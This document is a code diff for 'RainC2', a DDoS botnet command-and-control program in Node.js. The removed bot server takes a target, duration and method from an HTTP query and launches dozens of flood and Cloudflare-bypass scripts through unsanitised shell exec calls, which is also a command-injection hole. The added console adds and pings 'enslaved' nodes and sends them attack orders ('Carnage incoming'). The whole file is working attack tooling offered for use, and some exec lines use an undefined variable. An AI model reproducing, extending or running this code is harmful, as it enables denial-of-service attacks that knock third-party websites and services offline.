@@ -1,45 +1,290 @@
-const express = require('express');const { exec } = require('child_process');
-const app = express();const port = process.env.PORT || process.env.SERVER_PORT || 5552;const scrapeProxies = require('./proxy.js');
-async function fetchData() {
-  const response = await fetch('https://httpbin.org/get');  const data = await response.json();  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);  return data;}
+#!/usr/bin/env node
+const readline = require('readline');
+const url = require('url');
+const fs = require('fs');
+const axios = require('axios');
+const path = require('path');
+const crypto = require('crypto');
 
-app.get('/RainC2', (req, res) => {
-  const { target, time, methods } = req.query;
-  res.status(200).json({
-    message: 'API request received. Executing script shortly.',
-    target,
-    time,
-    methods
-  });
-  // Eksekusi sesuai methods
-  if (methods === 'HTTP-SICARIO') {
-    console.log('received');    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);  } else if (methods === 'RAW-HTTP') {
-    console.log('received');    exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/http-panel.js ${target} ${time}`);  } else if (methods === 'R9') {
-    console.log('received');    exec(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);    exec(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);    exec(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);  } else if (methods === 'PRIV-TOR') {
-    console.log('received');    exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);  } else if (methods === 'HOLD-PANEL') {
-    console.log('received');    exec(`node methods/http-panel.js ${target} ${time}`);  } else if (methods === 'R1') {
-    console.log('received');    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);            exec(`node methods/http-panel.js ${target} ${time}`);                exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);                    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);            exec(`node methods/http-panel.js ${target} ${time}`);                exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);                    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);            exec(`node methods/http-panel.js ${target} ${time}`);                exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);                    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);            exec(`node methods/http-panel.js ${target} ${time}`);                exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);                    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);    exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);    exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);    exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);    exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);        exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);            exec(`node methods/http-panel.js ${target} ${time}`);                exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);        exec(`node methods/strike.js GET ${target} ${duration} 10 90 proxy.txt --full --legit`); 
-        exec(`node methods/tls.js ${target} ${duration} 100 10`);
-        exec(`node methods/flood.js ${target} ${duration}`);
-        exec(`node methods/spike.js ${target} 10 ${duration}`);
-        exec(`node methods/raw.js ${target} ${duration}`); 
-        exec(`node methods/gojov5.js ${target} ${duration} 100 10 proxy.txt`);
-        exec(`node methods/TLS-KILL.js ${target} ${duration} 100 10 proxy.txt`);
-        exec(`node methods/tlsop.js ${target} ${duration} 100 10 proxy.txt`); 
-        exec(`node methods/storm.js ${target} ${duration} 100 10 proxy.txt`);  
-        exec(`node methods/DESTROY.js ${target} ${duration} 100 10 proxy.txt`);
-        exec(`node methods/thunder.js ${target} ${duration} 100 10 proxy.txt`);
-        exec(`node methods/bypass2.js ${target} ${duration} 100 10 proxy.txt`);
-        exec(`node methods/cf-flood.js ${target} ${duration}`);
-        exec(`node methods/HTTP-VIP.js ${target} ${duration} 100 10 proxy.txt`);  
-        exec(`node methods/uambypass.js ${target} ${duration} 100 proxy.txt`);
-        exec(`node methods/rape.js GET ${duration} 10 proxy.txt 100 ${target}`);
-        exec(`node methods/TORNADOV2.js GET ${target} ${duration} 10 100 proxy.txt`);    
-        exec(`node methods/RAW-MIX.js ${target} ${duration}`);
-        exec(`node methods/drown.js ${target} ${duration} 10 100`);
-        exec(`node methods/cookie.js ${target} ${duration} 10 100 proxy.txt`);
-        exec(`node methods/YAT-TLS.js ${target} ${duration} 100 10 proxy.txt`);
-  }
+// --- Configuration ---
+const LIB_DIR = path.join(__dirname, 'lib');
+const CONFIG_FILE_PATH = path.join(LIB_DIR, 'config.json');
+const BOTNET_FILE_PATH = path.join(LIB_DIR, 'botnet.json');
+const METHODS_FILE_PATH = path.join(LIB_DIR, 'methods.json');
+
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+  prompt: '\x1b[1m\x1b[31mRainC2\x1b[0m\x1b[1m > \x1b[0m'
 });
-app.listen(port, () => {
-  fetchData();});
+
+// --- Utility Functions ---
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function ensureLibDirExists() {
+  if (!fs.existsSync(LIB_DIR)) {
+    fs.mkdirSync(LIB_DIR, { recursive: true });
+    console.log(`\x1b[32m[SYSTEM]\x1b[0m Created library directory at: ${LIB_DIR}`);
+  }
+}
+
+function getConfig() {
+    if (!fs.existsSync(CONFIG_FILE_PATH)) {
+        return null;
+    }
+    try {
+        const configData = fs.readFileSync(CONFIG_FILE_PATH, 'utf-8');
+        return JSON.parse(configData);
+    } catch (error) {
+        console.error('\x1b[31m[FATAL]\x1b[0m Your config.json is corrupted. Fix it or delete it.');
+        process.exit(1);
+    }
+}
+
+function handleNetworkError(error, context) {
+    console.error(`\x1b[31m[ERROR]\x1b[0m ${context}`);
+    if (error.code) {
+        console.error(`\x1b[31m->\x1b[0m Code: ${error.code}. Check your network connection or the target URL.`);
+    } else if (error.response) {
+        console.error(`\x1b[31m->\x1b[0m Server responded with a shitty status: ${error.response.status}`);
+    } else {
+        console.error(`\x1b[31m->\x1b[0m Unknown network error: ${error.message}`);
+    }
+}
+
+// --- Core Functions ---
+
+function banner() {
+  console.clear();
+  console.log(`\x1b[31mRainC2\x1b[0m │ The Will of the Swarm, Manifested.
+Type \x1b[1m\x1b[32mhelp\x1b[0m to see your commands.
+\x1b[34m───────────────────────────────────────────────────────────────────────────────\x1b[0m
+`);
+}
+
+function setupKey() {
+    rl.question('\x1b[1m\x1b[36mNo access key found. Set a new one now: \x1b[0m', (newKey) => {
+        if (!newKey.trim()) {
+            console.error('\x1b[31m[ERROR]\x1b[0m The key cannot be empty, you moron.');
+            return setupKey();
+        }
+        const hashedKey = crypto.createHash('sha256').update(newKey.trim()).digest('hex');
+        const newConfig = { accessKeyHash: hashedKey };
+        fs.writeFileSync(CONFIG_FILE_PATH, JSON.stringify(newConfig, null, 2));
+        console.log('\x1b[32m[SUCCESS]\x1b[0m Access key set. Restart the application to log in.');
+        process.exit(0);
+    });
+}
+
+function login() {
+    const config = getConfig();
+    if (!config || !config.accessKeyHash) {
+        return setupKey();
+    }
+    
+    rl.question('\x1b[1m\x1b[36mEnter Access Key: \x1b[0m', async (inputKey) => {
+        const hashedInput = crypto.createHash('sha256').update(inputKey.trim()).digest('hex');
+        if (hashedInput === config.accessKeyHash) {
+            console.clear();
+            console.log(`\x1b[32mAuthentication Accepted. Welcome, Overlord.\x1b[0m`);
+            await sleep(1000);
+            await banner();
+            mainLoop();
+        } else {
+            console.log(`\x1b[31mWrong Key. You are not worthy.\x1b[0m`);
+            login();
+        }
+    });
+}
+
+async function bootup() {
+    console.clear();
+    console.log(`\x1b[1m[ \x1b[32mRainC2\x1b[0m \x1b[1m]\x1b[0m Initializing...`);
+    ensureLibDirExists();
+
+    const RainC2Methods = [
+        {"name": "HTTP-SICARIO", "description": "Composite high-request HTTP flood."},
+        {"name": "RAW-HTTP", "description": "Raw HTTP/2 and panel-focused flood."},
+        {"name": "R9", "description": "High dstat, hold, and bypass composite method."},
+        {"name": "PRIV-TOR", "description": "High-volume flood utilizing various vectors."},
+        {"name": "HOLD-PANEL", "description": "Direct HTTP panel attack."},
+        {"name": "R1", "description": "The ultimate swarm. All vectors, maximum chaos."}
+    ];
+    fs.writeFileSync(METHODS_FILE_PATH, JSON.stringify(RainC2Methods, null, 2));
+    
+    console.log(`\x1b[32m[SYSTEM]\x1b[0m Ready.`);
+    login();
+}
+
+// --- Command Functions ---
+
+function showMethods() {
+    const methodsData = JSON.parse(fs.readFileSync(METHODS_FILE_PATH, 'utf-8'));
+    console.log(`\n\x1b[0m NAME           │ DESCRIPTION`);
+    console.log(`\x1b[0m────────────────┼──────────────────────────────────────────────────`);
+    methodsData.forEach(method => {
+        console.log(`\x1b[31m${method.name.padEnd(14)}\x1b[0m │ ${method.description}`);
+    });
+}
+
+function addsrv(args) {
+    if (args.length < 1) {
+        console.log(`\x1b[33mUsage:\x1b[0m addsrv <endpoint_url>`);
+        return;
+    }
+    const endpoint = args[0];
+    try { new url.URL(endpoint); } catch { console.error(`\x1b[31m[ERROR]\x1b[0m Invalid URL: ${endpoint}`); return; }
+
+    let botnetData = { endpoints: [] };
+    if (fs.existsSync(BOTNET_FILE_PATH)) {
+        botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
+    }
+
+    if (botnetData.endpoints.includes(endpoint)) {
+        console.log(`\x1b[33m[INFO]\x1b[0m Endpoint ${endpoint} is already enslaved.`);
+    } else {
+        botnetData.endpoints.push(endpoint);
+        fs.writeFileSync(BOTNET_FILE_PATH, JSON.stringify(botnetData, null, 2));
+        console.log(`\x1b[32m[SUCCESS]\x1b[0m Endpoint ${endpoint} added to the swarm.`);
+    }
+}
+
+function delsrv(args) {
+    if (args.length < 1) {
+        console.log(`\x1b[33mUsage:\x1b[0m delsrv <endpoint_url_or_index>`);
+        return;
+    }
+    if (!fs.existsSync(BOTNET_FILE_PATH)) {
+         console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Nothing to delete.');
+         return;
+    }
+    
+    let botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
+    const initialCount = botnetData.endpoints.length;
+    
+    const arg = args[0];
+    const index = parseInt(arg, 10);
+
+    if (!isNaN(index) && index >= 0 && index < initialCount) {
+        const removed = botnetData.endpoints.splice(index, 1);
+        console.log(`\x1b[32m[SUCCESS]\x1b[0m Removed node #${index}: ${removed}`);
+    } else {
+        botnetData.endpoints = botnetData.endpoints.filter(e => e !== arg);
+    }
+    
+    if (botnetData.endpoints.length < initialCount) {
+        fs.writeFileSync(BOTNET_FILE_PATH, JSON.stringify(botnetData, null, 2));
+        if(isNaN(index)) console.log(`\x1b[32m[SUCCESS]\x1b[0m Endpoint ${arg} has been freed.`);
+    } else {
+        console.log(`\x1b[33m[INFO]\x1b[0m Endpoint not found.`);
+    }
+}
+
+
+async function listsrv() {
+    if (!fs.existsSync(BOTNET_FILE_PATH)) {
+        console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Enslave some servers with \`addsrv\` first.');
+        return;
+    }
+    const botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
+    if (!botnetData.endpoints || botnetData.endpoints.length === 0) {
+        console.log('\x1b[33m[INFO]\x1b[0m The swarm is empty. It craves nodes.');
+        return;
+    }
+
+    console.log(`\x1b[1m[RainC2]\x1b[0m Pinging ${botnetData.endpoints.length} node(s)...`);
+    const timeout = 8000;
+    const promises = botnetData.endpoints.map(async (endpoint, index) => {
+        try {
+            await axios.get(endpoint, { timeout, params: { target: 'https://google.com', time: 1, methods: 'test' } });
+            console.log(`\x1b[0m [#${index}] \x1b[32m[ONLINE]\x1b[0m  - ${endpoint}`);
+        } catch {
+            console.log(`\x1b[0m [#${index}] \x1b[31m[OFFLINE]\x1b[0m - ${endpoint}`);
+        }
+    });
+    await Promise.all(promises);
+}
+
+async function launchAttack(args) {
+    if (args.length < 3) {
+        console.log(`\x1b[33mUsage:\x1b[0m attack <target> <time> <method>`);
+        return;
+    }
+    const [target, time, method] = args;
+    if (isNaN(parseInt(time))) {
+        console.error(`\x1b[31m[ERROR]\x1b[0m Time must be a fucking number.`);
+        return;
+    }
+    
+    if (!fs.existsSync(BOTNET_FILE_PATH)) {
+        console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Enslave a server first.');
+        return;
+    }
+    const botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
+    if (!botnetData.endpoints || botnetData.endpoints.length === 0) {
+        console.error('\x1b[31m[ERROR]\x1b[0m No nodes in the swarm. Use `addsrv`.');
+        return;
+    }
+    
+    console.log(`\x1b[1;37mUnleashing the swarm on \x1b[36m${target}\x1b[0m for \x1b[36m${time}s\x1b[0m using method \x1b[36m${method.toUpperCase()}\x1b[0m...`);
+
+    let successCount = 0;
+    const requests = botnetData.endpoints.map(async (endpoint) => {
+        const apiUrl = `${endpoint}?target=${encodeURIComponent(target)}&time=${time}&methods=${method.toUpperCase()}`;
+        try {
+            await axios.get(apiUrl, { timeout: 15000 });
+            successCount++;
+        } catch { /* A single drone failure is irrelevant */ }
+    });
+    await Promise.all(requests);
+    console.log(`\n\x1b[32m[SUCCESS]\x1b[0m Attack command sent to ${successCount}/${botnetData.endpoints.length} online nodes. Carnage incoming.`);
+}
+
+// --- Main Command Loop ---
+async function mainLoop() {
+    rl.prompt();
+    rl.on('line', async (line) => {
+        const [command, ...args] = line.trim().split(/\s+/);
+        const action = command ? command.toLowerCase() : '';
+
+        switch (action) {
+            case 'help':
+                console.log(`
+\x1b[0mNAME         │ DESCRIPTION
+─────────────┼──────────────────────────────────────────────────
+ methods     │ Show list of available attack methods
+ addsrv      │ <url> - Enslave a new API node to the swarm
+ delsrv      │ <url|index> - Remove a node from the swarm
+ listsrv     │ Check status of all enslaved nodes
+ attack      │ <target> <time> <method> - Unleash the swarm
+ dev         │ Credit where credit is fucking due
+ clear       │ (cls, c) - Clear your pathetic screen
+ exit        │ (quit) - Terminate this session
+`);
+                break;
+            case 'methods': showMethods(); break;
+            case 'addsrv': addsrv(args); break;
+            case 'delsrv': delsrv(args); break;
+            case 'listsrv': await listsrv(); break;
+            case 'attack': await launchAttack(args); break;
+            case 'dev': console.log('\n\x1b[36mForged in the digital fires by Stevee & Gwyn.\x1b[0m\n'); break;
+            case 'clear': case 'cls': case 'c': banner(); break;
+            case 'exit': case 'quit': console.log('\x1b[0mGo cause some fucking chaos.\x1b[0m'); process.exit(0); break;
+            case '': break; // Do nothing if user just presses enter
+            default:
+                console.log(`\x1b[31mUnknown command: "${action}". Type "help", you fucking moron.\x1b[0m`);
+                break;
+        }
+        rl.prompt();
+    }).on('close', () => {
+        console.log('\nSession terminated.');
+        process.exit(0);
+    });
+}
+
+// --- Cleanup and Startup ---
+process.on('SIGINT', () => process.exit());
+bootup();
